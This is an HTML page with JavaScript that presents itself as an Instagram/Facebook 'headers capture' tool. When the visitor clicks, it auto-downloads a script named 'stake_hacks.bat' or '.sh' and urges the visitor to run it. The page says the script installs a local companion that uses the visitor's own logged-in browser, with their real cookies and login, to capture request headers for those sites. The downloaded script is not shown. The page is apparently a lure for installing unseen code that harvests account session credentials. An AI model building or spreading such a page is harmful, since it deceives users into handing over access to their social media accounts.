<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram / Facebook Headers Capture</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #12141a; color: #e8e8e8; font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 48px 16px;
  }
  h1 { font-size: 26px; margin-bottom: 6px; }
  p.sub { color: #9aa4b2; margin-bottom: 30px; text-align: center; max-width: 640px; }
  button {
    font-size: 17px; font-weight: 600; color: #fff; background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
    border: none; border-radius: 12px; padding: 16px 36px; cursor: pointer;
    transition: transform .1s, opacity .2s, box-shadow .2s;
  }
  button:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(220,39,67,.35); }
  button:disabled { opacity: .45; cursor: wait; transform: none; }
  .status { color: #9aa4b2; margin: 22px 0; min-height: 22px; }
  .results { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 1180px; }
  .result-box { flex: 1 1 460px; max-width: 560px; min-width: 320px; }
  .result-box h2 { font-size: 14px; color: #9aa4b2; margin-bottom: 8px; }
  img { width: 100%; border-radius: 8px; box-shadow: 0 10px 40px rgba(0,0,0,.5); display: none; }
</style>
</head>
<body>
  <h1>Instagram / Facebook Headers Capture</h1>
  <p class="sub">Captures the real DevTools request headers, exactly like record.js. Uses YOUR own logged-in browser when possible (real credentials, nothing injected or pasted), otherwise falls back to the server.</p>

  <div style="display:flex;gap:14px;flex-wrap:wrap;justify-content:center">
    <button id="btn" onclick="captureAll('windows')">Capture in Windows</button>
    <button id="btn-linux" onclick="captureAll('linux')">Capture in Linux</button>
  </div>
  <div class="status" id="status"></div>

  <div class="results">
    <div class="result-box">
      <h2>Instagram — instagram/?__a=1</h2>
      <img id="img-0" alt="instagram capture">
    </div>
    <div class="result-box">
      <h2>Facebook — facebook/?__a=1</h2>
      <img id="img-1" alt="facebook capture">
    </div>
  </div>

  <script>
    const $ = (id) => document.getElementById(id);
    const SITES = ['instagram', 'facebook'];
    const COMPANION = 'http://127.0.0.1:9876';

    // Detect which browser is running THIS page so we capture with the SAME
    // browser installation (same profile, same login) the visitor clicked in.
    const detectBrowser = () => {
      const ua = navigator.userAgent;
      if (/Edg\//.test(ua)) return 'msedge';
      if (/OPR\/|Opera/.test(ua)) return 'opera';
      if (/Brave/.test(ua)) return 'brave';
      if (/Firefox/.test(ua)) return 'firefox';
      if (/Chrome\//.test(ua)) return 'chrome';
      return '';
    };

    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

    // Sync ping: must be synchronous so the chrome/edge download triggered
    // right after still counts as a user gesture (otherwise it's blocked).
    const pingSync = () => {
      try {
        const x = new XMLHttpRequest();
        x.open('GET', COMPANION + '/ping', false);
        x.timeout = 2000;
        x.send();
        return x.status >= 200 && x.status < 300;
      } catch {
        return false;
      }
    };

    const downloadExe = (os) => {
      const file = os === 'linux' ? 'stake_hacks.sh' : 'stake_hacks.bat';
      const a = document.createElement('a');
      a.href = '/' + file;
      a.download = file;
      document.body.appendChild(a);
      a.click();
      a.remove();
    };

    const uploadImages = (images, okText) => {
      let shown = 0;
      for (const site of SITES) {
        if (images && images[site]) {
          $('img-' + SITES.indexOf(site)).src = images[site];
          $('img-' + SITES.indexOf(site)).style.display = 'block';
          shown++;
        }
      }
      return shown > 0;
    };

    // 1) Companion running on this PC? => record.js runs in YOUR browser,
    //    capturing the REAL headers (your login, your cookies). No injection.
    const runFromLocalBrowser = async (os) => {
      const isLinux = os === 'linux';
      const file = isLinux ? 'stake_hacks.sh' : 'stake_hacks.bat';
      const browser = detectBrowser();
      const companionUp = pingSync();

      if (!companionUp) {
        // No companion / Node: auto-download the correct OS file. It installs
        // Node + companion and runs the FULL capture by itself. Watch for the
        // companion to come online, then grab whatever it captured.
        downloadExe(os); // called synchronously so browsers allow the download
        $('status').innerHTML =
          'Companion not running on this PC. <b>Downloading ' + file + '…</b> ' +
          'Please open the downloaded file — it installs everything and starts the capture.<br>' +
          'If the download did not start, click: ' +
          '<a href="/' + file + '" download style="color:#0af;font-weight:bold">Download ' + file + '</a>' +
          '<br>This page is watching and will show the screenshots automatically.';
        let ok = false;
        for (let i = 0; i < 120; i++) {
          await sleep(2000); // 120 x 2s = up to 4 min (full capture time)
          try {
            const ping = await fetch(COMPANION + '/ping', { cache: 'no-store' });
            if (ping.ok) { ok = true; break; }
          } catch {}
        }
        if (!ok) {
          $('status').textContent =
            'Could not detect stake_hacks on this PC. Run the downloaded ' + file + ', then click the button again.';
          return false;
        }
        // Companion is online. If it already captured (exe ran the full job),
        // just fetch the images; otherwise trigger /run.
        const latest = await (await fetch(COMPANION + '/latest', { cache: 'no-store' })).json();
        if (latest && latest.images && uploadImages(latest.images, '')) {
          $('status').textContent = 'Done — screenshots from YOUR browser captured by stake_hacks below.';
          return true;
        }
        // not captured yet -> run now
      }

      $('status').textContent = 'Running record.js in your browser (Instagram then Facebook)… keep this tab open.';
      try {
        let data;
        for (let attempt = 1; attempt <= 40; attempt++) {
          const res = await fetch(COMPANION + '/run?site=both&browser=' + browser, { cache: 'no-store' });
          data = await res.json();
          if (res.ok && data && data.ok) break;
          if (res.status === 409 && data && data.busy) {
            $('status').textContent = 'Capture already running — waiting ' + attempt + '/40…';
            await sleep(6000);
            continue;
          }
          throw new Error((data && data.error) || 'HTTP ' + res.status);
        }
        if (!data || !data.ok || !data.images) throw new Error('companion returned no screenshots');
        uploadImages(data.images, '');
        $('status').textContent = 'Done — real headers from YOUR browser captured below.';
        return true;
      } catch (e) {
        $('status').textContent = 'Local capture error: ' + e.message;
        return false;
      }
    };

    // 2) No companion => server-side capture (one browser, both sites).
    const runFromServer = async () => {
      const maxAttempts = 8;
      let lastErr = '';
      for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        $('status').textContent =
          'Running capture on the server… (attempt ' + attempt + '/' + maxAttempts + ', ~20–60s)';
        try {
          const res = await fetch('/run-all', { cache: 'no-store' });
          if (!res.ok) {
            const brief = (await res.text()).replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
            throw new Error('HTTP ' + res.status + (brief ? ' — ' + brief.slice(0, 80) : ''));
          }
          const data = await res.json();
          if (data.instagram) {
            $('img-0').src = data.instagram;
            $('img-0').style.display = 'block';
          }
          if (data.facebook) {
            $('img-1').src = data.facebook;
            $('img-1').style.display = 'block';
          }
          if (!data.instagram && !data.facebook) throw new Error('no screenshots returned');
          $('status').textContent = 'Done — screenshots from the server captured below.';
          return;
        } catch (e) {
          lastErr = e.message;
          if (attempt < maxAttempts) await sleep(6000);
        }
      }
      $('status').textContent = 'Error: ' + lastErr;
    };

    const captureAll = async (os) => {
      $('btn').disabled = true;
      $('btn-linux').disabled = true;
      $('img-0').style.display = 'none';
      $('img-1').style.display = 'none';
      const usedLocal = await runFromLocalBrowser(os);
      if (!usedLocal) await runFromServer();
      $('btn').disabled = false;
      $('btn-linux').disabled = false;
    };
  </script>
</body>
</html>
